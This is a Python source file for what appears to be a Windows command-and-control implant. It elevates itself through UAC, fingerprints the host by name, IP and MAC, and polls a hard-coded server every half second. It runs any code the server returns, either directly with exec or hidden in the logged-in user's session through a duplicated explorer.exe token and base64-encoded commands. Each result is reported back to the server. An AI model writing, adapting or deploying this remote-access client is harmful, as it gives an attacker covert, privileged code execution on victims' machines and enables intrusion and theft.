import os
import threading
from socket import gethostname, gethostbyname
from uuid import getnode
from time import sleep
import requests
import sys
import win32api
import win32con
import win32process
import win32security
import win32ts
import win32profile
import win32gui
import ctypes
import base64

SERVER_URL = "http://192.168.10.77:8000"
WS_URL = "ws://192.168.10.77:8000/ws"
PAYLOAD_RESPONSE_API = "/payload_response"
IP_V4_ADDRESS = gethostbyname(gethostname())
MAC_ADDRESS = ':'.join(f'{(getnode() >> ele) & 0xff:02x}' for ele in range(40, -1, -8))
PC_NAME = "PC"
try:
    PC_NAME = os.getenv('COMPUTERNAME')
except Exception as e:
    print(f"Couldn't get pc name {e}")
USER_ID_FILE = "UniqueUserID.txt"
USER_ID = ""
user_id_lock = threading.Lock()
if os.path.exists(USER_ID_FILE):
    with open(USER_ID_FILE, "r") as id_file:
        USER_ID = id_file.read()
headers = {
    "x-pc-name": PC_NAME,
    "x-ip-address": IP_V4_ADDRESS,
    "x-mac-address": MAC_ADDRESS,
    "x-user-id": USER_ID,
}
header_lock = threading.Lock()
PYTHON_EXE = sys.executable

def elevate():
    """Re-launch the current script with UAC elevation if not already admin."""
    if ctypes.windll.shell32.IsUserAnAdmin():
        return  # Already elevated, nothing to do

    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        " ".join(f'"{arg}"' for arg in sys.argv),
        None,
        1
    )
    sys.exit()

def launch_python_code_in_user_session_headless(code: str):
    try:
        # 1. Get explorer.exe token (interactive user)
        hwnd = win32gui.GetShellWindow()
        if not hwnd:
            print("No shell window found")
            return

        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        h_process = win32api.OpenProcess(
            win32con.PROCESS_QUERY_INFORMATION, False, pid
        )
        h_token = win32security.OpenProcessToken(
            h_process,
            win32con.TOKEN_DUPLICATE
            | win32con.TOKEN_ASSIGN_PRIMARY
            | win32con.TOKEN_QUERY
        )

        # 2. Duplicate token → primary token
        duplicated_token = win32security.DuplicateTokenEx(
            h_token,
            win32con.MAXIMUM_ALLOWED,
            win32security.SecurityIdentification,
            win32security.TokenPrimary,
            None
        )

        # 3. Create user environment block
        user_env = win32profile.CreateEnvironmentBlock(duplicated_token, False)

        # 4. Encode Python code to run
        encoded = base64.b64encode(code.encode("utf-8")).decode("ascii")
        cmd = f'"{PYTHON_EXE}" -c "import base64; exec(base64.b64decode(\'{encoded}\'))"'

        # 5. Setup startup info for headless execution
        startup = win32process.STARTUPINFO()
        startup.dwFlags |= win32con.STARTF_USESHOWWINDOW
        startup.wShowWindow = win32con.SW_HIDE  # hide window

        # 6. Launch process silently
        win32process.CreateProcessAsUser(
            duplicated_token,
            None,
            cmd,
            None,
            None,
            False,
            win32con.CREATE_NO_WINDOW | win32con.CREATE_UNICODE_ENVIRONMENT,
            user_env,
            None,
            startup
        )

    except Exception as e:
        print(f"error: {e}")

def run_payload_code(code: str):
    exec(code, globals())

def execute_payload(payload_code, payload_id, launch_as_user):
    try:
        if launch_as_user:
            launch_python_code_in_user_session_headless(payload_code)
        else:
            run_payload_code(payload_code)
        payload_status, err = "success", ""
    except Exception as e:
        print(f"Payload {payload_id} error:", e)
        payload_status, err = "fail", str(e)
    params = {
        "payload_executed": str(payload_code),
        "payload_status": str(payload_status),
        "payload_error": str(err) if err is not None else ""
    }
    try:
        resp = requests.get(f"{SERVER_URL}{PAYLOAD_RESPONSE_API}", params=params, headers=headers)
    except Exception as e:
        print(f"Failed to report payload {payload_id}:", e)

def handle_response(resp):
    global USER_ID, headers
    try:
        data = resp.json()
        with user_id_lock:
            if not USER_ID:
                USER_ID = data.get("user_id")
                with open(USER_ID_FILE, "w") as f:
                    f.write(USER_ID)
            with header_lock:
                headers["x-user-id"] = USER_ID
        payload = data.get("payload")
        if payload:
            payload_id = hash(payload)
            print(f"Starting payload {payload_id}")
            is_user_mode = data.get("is_user_mode")
            payload_thread = threading.Thread(
                target=execute_payload,
                args=(payload, payload_id, is_user_mode),
                daemon=False
            )
            payload_thread.start()
    except Exception as e:
        print("Poll error:", e)

def poll_server():
    while True:
        try:
            resp = requests.get(SERVER_URL, headers=headers)
            handle_response_thread = threading.Thread(target=handle_response, args=(resp,), daemon=False)
            handle_response_thread.start()
        except Exception as e:
            print(f"Couldn't poll server: {e}")
        sleep(0.5)

if __name__ == "__main__":
    elevate()
    poll_server()
